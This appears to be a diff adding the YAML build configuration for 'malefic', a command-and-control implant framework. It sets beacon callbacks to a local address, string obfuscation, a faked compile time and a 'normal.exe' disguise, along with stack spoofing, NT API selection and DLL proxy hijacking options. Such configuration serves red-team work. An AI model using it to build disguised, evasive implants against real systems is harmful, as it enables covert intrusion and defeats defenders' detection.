@@ -1,0 +1,124 @@
+basic:
+  name: "malefic"
+  proxy:
+    use_env_proxy: false
+    url: ""
+  cron: "*/5 * * * * * *"
+  jitter: 0.2
+  keepalive: false
+  retry: 10
+  max_cycles: -1
+  encryption: aes
+  key: maliceofinternal
+
+  secure:
+    enable: false
+    private_key: ""
+    public_key: ""
+
+  dga:
+    enable: false
+    key: "malefic_dga_2024"
+    interval_hours: 8
+
+  guardrail:
+    enable: false
+    require_all: true
+    ip_addresses: []
+    usernames: []
+    server_names: []
+    domains: []
+
+  targets:
+    - address: "127.0.0.1:443"
+      tcp: {}
+
+build:
+  obfstr: true
+  zigbuild: false
+  toolchain: "nightly-2024-02-03"
+  ollvm:
+    enable: false
+    bcfobf: false
+    splitobf: false
+    subobf: false
+    fco: false
+    constenc: false
+  metadata:
+    icon: ""
+    compile_time: "24 Jun 2015 18:03:01"
+    file_version: ""
+    product_version: ""
+    company_name: ""
+    product_name: ""
+    original_filename: "normal.exe"
+    file_description: "normal"
+    internal_name: ""
+    require_admin: false
+    require_uac: false
+
+pulse:
+  flags:
+    start: 0x41
+    end: 0x42
+    magic: "beautiful"
+    artifact_id: 0
+  encryption: xor
+  key: "maliceofinternal"
+  target: 127.0.0.1:443
+  protocol: "https"
+  api_type: "wininet"
+  http:
+    method: "POST"
+    path: "/pulse"
+    host: "127.0.0.1"
+    version: "1.1"
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
+
+implants:
+  runtime: tokio
+  mod: beacon
+  register_info: true
+  hot_load: true
+  modules:
+    - "full"
+  enable_3rd: false
+  3rd_modules:
+    - full
+  prelude: ""
+  pack: []
+  flags:
+    start: 0x41
+    end: 0x42
+    magic: "beautiful"
+    artifact_id: 0x1
+  anti:
+    sandbox: false
+    vm: false
+  apis:
+    level: "nt_apis"
+    priority:
+      normal:
+        enable: false
+        type: "normal"
+      dynamic:
+        enable: true
+        type: "user_defined_dynamic"
+      syscalls:
+        enable: false
+        type: "inline_syscall"
+  alloctor:
+    inprocess: "NtAllocateVirtualMemory"
+    crossprocess: "NtAllocateVirtualMemory"
+  thread_stack_spoofer: true
+
+loader:
+  proxydll:
+    proxyfunc: ""
+    raw_dll: ""
+    proxied_dll: ""
+    proxy_dll: ""
+    pack_resources: true
+    block: false
+    hijack_dllmain: true
